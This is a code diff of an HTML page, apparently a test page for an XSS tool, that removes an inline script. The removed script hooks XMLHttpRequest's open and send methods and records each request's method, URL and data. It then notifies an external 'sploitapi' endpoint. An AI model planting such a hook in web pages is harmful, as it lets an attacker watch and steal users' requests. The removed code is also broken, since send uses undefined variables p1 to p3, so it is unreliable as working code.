@@ -10,51 +10,5 @@
 <script src="//ajax.googleapis.com/ajax/libs/jquery/1.11.1/jquery.min.js"></script>
 <script src="http://localhost/h.php"></script>
 
-<script>
-	function reqListener () {
-		  console.log(this.responseText);
-	  }
-	var xssend = XMLHttpRequest.prototype.send;
-	var xssopen = XMLHttpRequest.prototype.open;
-	//console.log("global:");
-	//console.log(xssend);
-	var xssxhr = {};
-	XMLHttpRequest.prototype.open = function(method, url, data) {
-		/*	
-		console.log("BEGIN custom open:");
-		console.log(method);
-		console.log(data1);
-		console.log(data2);
-		console.log(data3);
-		console.log(this);
-		console.log("END custom open.");
-		*/
-		xssxhr.method=method;
-		xssxhr.url=url;
-		this.origopen(method, url, data);
-	}
-	XMLHttpRequest.prototype.send = function(d1, d2, d3) {
-		//console.log("BEGIN custom send: ");
-		console.log(p1);
-		xssxhr.data=d1;
-		xssxhr.data2=d2;
-		cs(sploitapi+"?xhr=1");
-		this.origsend(p1, p2, p3);
-		//console.log("END custom send.");
-	}
-
-	XMLHttpRequest.prototype.origsend = xssend;
-	XMLHttpRequest.prototype.origopen = xssopen;
-
-	/*
-	var oReq = new XMLHttpRequest();
-	oReq.onload = reqListener;
-	oReq.open("get", "http://www.mydomain.com", true);
-	oReq.send();
-	*/
-//	$.post("/foobar.php", {post1: "value1"}, function(data) { alert("POSTED DATA!"); });
-//	$.get("/foobar.php", {param1: "get1"}, function(data) { alert("GET DATA!"); } );
-
-</script>
 </body>
 </html>
